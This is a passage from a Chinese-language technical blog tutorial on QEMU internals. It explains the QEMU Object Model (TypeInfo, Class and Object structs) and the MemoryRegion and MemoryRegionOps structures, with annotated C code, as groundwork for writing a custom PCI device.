class="hljs-meta">#!/bin/bash</span><br>qemu-system-x86_64 \<br>-m 2G \<br>-smp 2 \<br>-kernel ./bzImage \<br>-append <span class="hljs-string">&quot;root=/dev/sda&quot;</span> \<br>-drive file=./stretch.img,format=raw \<br>-enable-kvm \<br>-vnc yourip:0<br></code></pre></td></tr></table></figure><p>之后还是直接用 vnc 进行连接即可（如果只需要在本地运行的话可以不用附加 <code>-vnc</code> 参数，而是加上 <code>-nographic</code> 参数）：</p><p><img src="https://s2.loli.net/2022/07/12/yjcVlhtYOz4pQvC.png" alt="image.png"></p><h1 id="0x03-简易-QEMU-设备编写"><a href="#0x03-简易-QEMU-设备编写" class="headerlink" title="0x03.简易 QEMU 设备编写"></a>0x03.简易 QEMU 设备编写</h1><p>虽然 Qemu 支持模拟多种设备，但是并不能涵盖现存所有的设备类型，同时有的时候出于一些特殊的目的我们也需要自定义一些设备，因此本节主要讲述如何在 Qemu 当中编写一个新的 PCI 类型的设备</p><blockquote><p>注1：在开始之前你可能需要补充一些<a href="https://arttnba3.cn/2022/08/20/HARDWARE-0X00-PCI_DEVICE/">PCI 设备的基础知识</a></p><p>注2：qemu 官方在 <code>hw/misc/edu.c</code> 中也提供了一个教学用的设备样例，red hat 则在 <code>hw/misc/pci-testdev.c</code> 中提供了一个测试设备，我们可以参考这两个设备来构建我们的设备</p></blockquote><h2 id="一、Qemu-Object-Model"><a href="#一、Qemu-Object-Model" class="headerlink" title="一、Qemu Object Model"></a>一、Qemu Object Model</h2><p>虽然 Qemu 是使用 C 编写的，但是其代码也充满了 OOP 的思想，在 Qemu 当中有着一套叫做 <strong>Qemu Object Model</strong> 的东西来实现面向对象，主要由这四个组件构成：</p><ul><li><code>Type</code>：用来定义一个「类」的基本属性，例如类的名字、大小、构造函数等</li><li><code>Class</code>：用来定义一个「类」的静态内容，例如类中存储的静态数据、方法函数指针等</li><li><code>Object</code>：动态分配的一个「类」的具体的实例（instance），储存类的动态数据</li><li><code>Property</code>：动态对象数据的访问器（accessor），可以通过监视器接口进行检查</li></ul><p>类似于 Golang，在 QOM 当中使用成员嵌套的方式来完成类的继承，父类作为类结构体的第一个成员 <code>parent</code> 而存在，因此也不支持多继承</p><blockquote><p>参见这个<a href="https://www.linux-kvm.org/images/f/f6/2012-forum-QOM_CPU.pdf">ppt</a></p></blockquote><h3 id="I、TypeInfo-类的基本属性"><a href="#I、TypeInfo-类的基本属性" class="headerlink" title="I、TypeInfo - 类的基本属性"></a>I、TypeInfo - 类的基本属性</h3><p><code>TypeInfo</code> 这一结构体用来定义一个「类」的基本属性，该结构体定义于 <code>include/qom/object.h</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * TypeInfo:</span><br><span class="hljs-comment"> * @name: 类型名.</span><br><span class="hljs-comment"> * @parent: 父类型名.</span><br><span class="hljs-comment"> * @instance_size: 对象大小 (#Object 的衍生物). </span><br><span class="hljs-comment"> *   若 @instance_size 为 0, 则对象的大小为其父类的大小</span><br><span class="hljs-comment"> * @instance_init: 该函数被调用以初始化对象（译注：构造函数）. </span><br><span class="hljs-comment"> *   （译注：调用前）父类已被初始化，因此子类只需要初始化他自己的成员。</span><br><span class="hljs-comment"> * @instance_post_init: 该函数被调用以结束一个对象的初始化，</span><br><span class="hljs-comment"> *   在所有的 @instance_init 函数被调用之后.</span><br><span class="hljs-comment"> * @instance_finalize: 该函数在对象被析构时调用. 其在</span><br><span class="hljs-comment"> *   父类的 @instance_finalize 被调用之前被调用.</span><br><span class="hljs-comment"> *   在该函数中一个对象应当仅释放该对象特有的成员。</span><br><span class="hljs-comment"> * @abstract: 若该域为真，则该类为一个虚类，不能被直接实例化。</span><br><span class="hljs-comment"> * @class_size: 这个对象的类对象的大小 (#Object 的衍生物)</span><br><span class="hljs-comment"> *   若 @class_size 为 0, 则类的大小为其父类的大小。</span><br><span class="hljs-comment"> *   这允许一个类型在没有添加额外的虚函数时避免实现一个显式的类型。</span><br><span class="hljs-comment"> * @class_init: 该函数在所有父类初始化结束后被调用，</span><br><span class="hljs-comment"> *   以允许一个类设置他的默认虚方法指针.</span><br><span class="hljs-comment"> *   这也允许该函数重写父类的虚方法。</span><br><span class="hljs-comment"> * @class_base_init: 在所有的父类被初始化后、但</span><br><span class="hljs-comment"> *   在类自身初始化前，为所有的基类调用该函数。</span><br><span class="hljs-comment"> *   该函数用以撤销从父类 memcpy 到子类的影响.</span><br><span class="hljs-comment"> * @class_data: 传递给 @class_init 与 @class_base_init 的数据,</span><br><span class="hljs-comment"> *   这会在建立动态类型时有用。</span><br><span class="hljs-comment"> * @interfaces: 与这个类型相关的接口. </span><br><span class="hljs-comment"> *   其应当指向一个以 0 填充元素结尾的静态数组</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TypeInfo</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *parent;<br><br>    <span class="hljs-type">size_t</span> instance_size;<br>    <span class="hljs-type">void</span> (*instance_init)(Object *obj);<br>    <span class="hljs-type">void</span> (*instance_post_init)(Object *obj);<br>    <span class="hljs-type">void</span> (*instance_finalize)(Object *obj);<br><br>    <span class="hljs-type">bool</span> abstract;<br>    <span class="hljs-type">size_t</span> class_size;<br><br>    <span class="hljs-type">void</span> (*class_init)(ObjectClass *klass, <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> (*class_base_init)(ObjectClass *klass, <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> *class_data;<br><br>    InterfaceInfo *interfaces;<br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们在 Qemu 中要定义一个「类」的时候，我们实际上需要定义一个 TypeInfo 类型的变量，例如下面就是一个在 Qemu 定义一个自定义类的🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> a3_register_types(<span class="hljs-type">void</span>) &#123;<br>    type_register_static(&amp;a3_type_info);<br>&#125;<br><br>type_init(a3_register_types);<br></code></pre></td></tr></table></figure><p><code>type_init()</code> 其实就是 <code>constructor</code> 这一 gcc attribute 的封装，其作用就是将一个函数加入到一个 <code>init_array</code> 当中，在 Qemu 程序启动时在进入到 main 函数之前会先调用 <code>init_array</code> 中的函数，因此这里会调用我们自定义的函数，其作用便是调用 <code>type_register_static()</code> 将我们自定义的类型 <code>a3_type_info</code> 注册到全局的类型表中</p><h3 id="II、Class-类的静态内容"><a href="#II、Class-类的静态内容" class="headerlink" title="II、Class - 类的静态内容"></a>II、Class - 类的静态内容</h3><p>当我们通过一个 <code>TypeInfo</code> 结构体定义了一个类之后，我们还需要定义一个 Class 结构体来定义这个类的静态内容，包括函数表、静态成员等，其应当继承于对应的 Class 结构体类型，例如我们若是要定义一个新的机器类，则其 Class 应当继承于 <code>MachineClass</code></p><p>所有 Class 结构体类型的最终的父类都是 <code>ObjectClass</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ObjectClass:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 所有类的基类.  #ObjectClass 仅包含一个整型类型 handler</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ObjectClass</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    Type type;<br>    GSList *interfaces;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];<br><br>    ObjectUnparent *unparent;<br><br>    GHashTable *properties;<br>&#125;;<br></code></pre></td></tr></table></figure><p>下面是一个最简单的🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3Class</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    ObjectClass parent;<br>&#125;<br></code></pre></td></tr></table></figure><p>完成 Class 的定义之后我们还应当在前面定义的 <code>a3_type_info</code> 中添加上 Class size 与 Class 的构造函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    <span class="hljs-comment">// 这里的 oc 参数便是新创建的 Class，全局只有一个该实例</span><br>    <span class="hljs-comment">// 我们应当 cast 为我们自己的 Class 类型，之后再进行相应操作</span><br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3Class),<br>    .class_init = a3_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III、Object-类的实例对象"><a href="#III、Object-类的实例对象" class="headerlink" title="III、Object - 类的实例对象"></a>III、Object - 类的实例对象</h3><p>我们还需要定义一个相应的 Object 类型来表示一个实例对象，其包含有这个类实际的具体数据，且应当继承于对应的 Object 结构体类型，例如我们若是要定义一个新的机器类型，其实例类型应当继承自 <code>MachineState</code></p><p>所有 Object 结构体类型的最终的父类都是 <code>Object</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Object:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 所有对象的基类。该对象的第一个成员为一个指向 #ObjectClass 的指针。</span><br><span class="hljs-comment"> * 因为 C 中将一个结构体的第一个成员组织在该结构体的 0 字节起始处，</span><br><span class="hljs-comment"> * 只要任何的子类将其父类作为第一个成员，我们都能直接转化为一个 #Object.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 因此, #Object 包含一个对对象类的引用作为其第一个成员。 </span><br><span class="hljs-comment"> * 这允许在运行时识别对象的真实类型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    ObjectClass *<span class="hljs-class"><span class="hljs-keyword">class</span>;</span><br>    ObjectFree *<span class="hljs-built_in">free</span>;<br>    GHashTable *properties;<br>    <span class="hljs-type">uint32_t</span> ref;<br>    Object *parent;<br>&#125;;<br></code></pre></td></tr></table></figure><p>下面是一个🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    Object parent;<br>&#125;<br></code></pre></td></tr></table></figure><p>完成 Object 的定义之后我们还应当在前面定义的 <code>a3_type_info</code> 中添加上 Object size 与 Object 的构造函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_object_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// 这里的 obj 参数便是动态创建的类型实例</span><br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .instance_init = a3_object_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3Object),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3Class),<br>    .class_init = a3_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IV、类的创建与释放"><a href="#IV、类的创建与释放" class="headerlink" title="IV、类的创建与释放"></a>IV、类的创建与释放</h3><p>类似于在 C++ 当中使用 <code>new</code> 与 <code>delete</code> 来创建与释放一个类实例，在 QOM 中我们应当使用 <code>object_new()</code> 与 <code>object_delete()</code> 来创建与销毁一个 QOM 类实例，本质上就是 <code>分配/释放类空间 + 显示调用构造/析构函数</code></p><p>QOM 判断创建类实例的类型是通过类的名字，即 <code>TypeInfo-&gt;name</code>，当创建类实例时 Qemu 会遍历所有的 TypeInfo 并寻找名字匹配的那个，从而调用到对应的构造函数，并将其基类 <code>Object-&gt;class</code> 指向对应的 class</p><p>下面是一个🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// create a QOM object</span><br>A3Object *a3obj = object_new(<span class="hljs-string">&quot;a3_type&quot;</span>);<br><span class="hljs-comment">// delete a QOM object</span><br>object_delete(a3obj);<br></code></pre></td></tr></table></figure><h2 id="二、MemoryRegion-Qemu-中的一块内存区域"><a href="#二、MemoryRegion-Qemu-中的一块内存区域" class="headerlink" title="二、MemoryRegion - Qemu 中的一块内存区域"></a>二、MemoryRegion - Qemu 中的一块内存区域</h2><p>在 Qemu 当中使用 <code>MemoryRegion</code> 结构体类型来表示一块具体的 Guest 物理内存区域，该结构体定义于 <code>include/exec/memory.h</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/** MemoryRegion:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 表示一块内存区域的一个结构体.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryRegion</span> &#123;</span><br>    Object parent_obj;<br><br>    <span class="hljs-comment">/* private: */</span><br><br>    <span class="hljs-comment">/* The following fields should fit in a cache line */</span><br>    <span class="hljs-type">bool</span> romd_mode;<br>    <span class="hljs-type">bool</span> ram;<br>    <span class="hljs-type">bool</span> subpage;<br>    <span class="hljs-type">bool</span> readonly; <span class="hljs-comment">/* For RAM regions */</span><br>    <span class="hljs-type">bool</span> nonvolatile;<br>    <span class="hljs-type">bool</span> rom_device;<br>    <span class="hljs-type">bool</span> flush_coalesced_mmio;<br>    <span class="hljs-type">bool</span> global_locking;<br>    <span class="hljs-type">uint8_t</span> dirty_log_mask;<br>    <span class="hljs-type">bool</span> is_iommu;<br>    RAMBlock *ram_block;<br>    Object *owner;<br><br>    <span class="hljs-type">const</span> MemoryRegionOps *ops;<br>    <span class="hljs-type">void</span> *opaque;<br>    MemoryRegion *container;<span class="hljs-comment">// 指向父 MemoryRegion</span><br>    Int128 size;<span class="hljs-comment">// 内存区域大小</span><br>    hwaddr addr;<span class="hljs-comment">// 在父 MR 中的偏移量</span><br>    <span class="hljs-type">void</span> (*destructor)(MemoryRegion *mr);<br>    <span class="hljs-type">uint64_t</span> align;<br>    <span class="hljs-type">bool</span> terminates;<br>    <span class="hljs-type">bool</span> ram_device;<br>    <span class="hljs-type">bool</span> enabled;<br>    <span class="hljs-type">bool</span> warning_printed; <span class="hljs-comment">/* For reservations */</span><br>    <span class="hljs-type">uint8_t</span> vga_logging_count;<br>    MemoryRegion *alias;<span class="hljs-comment">// 仅在 alias MR 中，指向实际的 MR</span><br>    hwaddr alias_offset;<br>    <span class="hljs-type">int32_t</span> priority;<br>    QTAILQ_HEAD(, MemoryRegion) subregions;<br>    QTAILQ_ENTRY(MemoryRegion) subregions_link;<br>    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">unsigned</span> ioeventfd_nb;<br>    MemoryRegionIoeventfd *ioeventfds;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 Qemu 当中有三种类型的 MemoryRegion：</p><ul><li>MemoryRegion 根：通过 <code>memory_region_init()</code> 进行初始化，其用以表示与管理由多个 sub-MemoryRegion 组成的一个内存区域，并不实际指向一块内存区域，例如 <code>system_memory</code></li><li>MemoryRegion 实体：通过 <code>memory_region_init_ram()</code> 初始化，表示具体的一块大小为 size 的内存空间，指向一块具体的内存</li><li>MemoryRegion 别名：通过 <code>memory_region_init_alias()</code> 初始化，作为另一个 MemoryRegion 实体的别名而存在，不指向一块实际内存</li></ul><p>MR 容器与 MR 实体间构成树形结构，其中容器为根节点而实体为子节点：</p><blockquote><p>下图来自于<a href="https://richardweiyang-2.gitbook.io/understanding_qemu/00-as/02-memoryregion">这里</a></p></blockquote><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                       struct MemoryRegion<br>                       +------------------------+                                         <br>                       |<span class="hljs-string">name                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (const char *)        </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">addr                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (hwaddr)              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">size                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (Int128)              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">subregions              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                                  </span>|<br>                                  |<span class="hljs-string"></span><br><span class="hljs-string">          ----+-------------------+---------------------+----</span><br><span class="hljs-string">              </span>|<span class="hljs-string">                                         </span>|<br>              |<span class="hljs-string">                                         </span>|<br>              |<span class="hljs-string">                                         </span>|<br><br>struct MemoryRegion                            struct MemoryRegion<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">name                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">name                    </span>|<br>|<span class="hljs-string">  (const char *)        </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (const char *)        </span>|<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">addr                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">addr                    </span>|<br>|<span class="hljs-string">  (hwaddr)              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (hwaddr)              </span>|<br>|<span class="hljs-string">size                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">size                    </span>|<br>|<span class="hljs-string">  (Int128)              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (Int128)              </span>|<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">subregions              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">subregions              </span>|<br>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<br>+------------------------+                     +------------------------+<br></code></pre></td></tr></table></figure><p>相应地，基于 OOP 的思想，MemoryRegion 的成员函数被封装在函数表 <code>MemoryRegionOps</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Memory region callbacks</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryRegionOps</span> &#123;</span><br>    <span class="hljs-comment">/* 从内存区域上读. @addr 与 @mr 有关; @size 单位为字节. */</span><br>    <span class="hljs-type">uint64_t</span> (*read)(<span class="hljs-type">void</span> *opaque,<br>                     hwaddr addr,<br>                     <span class="hljs-type">unsigned</span> size);<br>    <span class="hljs-comment">/* 往内存区域上写. @addr 与 @mr 有关; @size 单位为字节. */</span><br>    <span class="hljs-type">void</span> (*write)(<span class="hljs-type">void</span> *opaque,<br>                  hwaddr addr,<br>                  <span class="hljs-type">uint64_t</span> data,<br>                  <span class="hljs-type">unsigned</span> size);<br><br>    MemTxResult (*read_with_attrs)(<span class="hljs-type">void</span> *opaque,<br>                                   hwaddr addr,<br>                                   <span class="hljs-type">uint64_t</span> *data,<br>                                   <span class="hljs-type">unsigned</span> size,<br>                                   MemTxAttrs attrs);<br>    MemTxResult (*write_with_attrs)(<span class="hljs-type">void</span> *opaque,<br>                                    hwaddr addr,<br>                                    <span class="hljs-type">uint64_t</span> data,<br>                                    <span class="hljs-type">unsigned</span> size,<br>                                    MemTxAttrs attrs);<br><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">device_endian</span> <span class="hljs-title">endianness</span>;</span><br>    <span class="hljs-comment">/* Guest可见约束: */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-comment">/* 若非 0，则指定了超出机器检查范围的访问大小界限</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> min_access_size;<br>        <span class="hljs-type">unsigned</span> max_access_size;<br>        <span class="hljs-comment">/* If true, unaligned accesses are supported.  Otherwise unaligned</span><br><span class="hljs-comment">         * accesses throw machine checks.</span><br><span class="hljs-comment">         */</span><br>         <span class="hljs-type">bool</span> unaligned;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 若存在且 #false, 则该事务不会被设备所接受</span><br><span class="hljs-comment">         * (并导致机器的相关行为，例如机器检查异常).</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">bool</span> (*accepts)(<span class="hljs-type">void</span> *opaque, hwaddr addr,<br>                        <span class="hljs-type">unsigned</span> size, <span class="hljs-type">bool</span> is_write,<br>                        MemTxAttrs attrs);<br>    &#125; valid;<br>    <span class="hljs-comment">/* 内部应用约束: */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-comment">/* 若非 0，则决定了最小的实现的 size .</span><br><span class="hljs-comment">         * 更小的 size 将被向上回绕，且将返回部分结果.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> min_access_size;<br>        <span class="hljs-comment">/* 若非 0，则决定了最大的实现的 size . </span><br><span class="hljs-comment">         * 更大的 size 将被作为一系列的更小的 size 的访问而完成.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> max_access_size;<br>        <span class="hljs-comment">/* 若为 true, 支持非对齐的访问.  </span><br><span 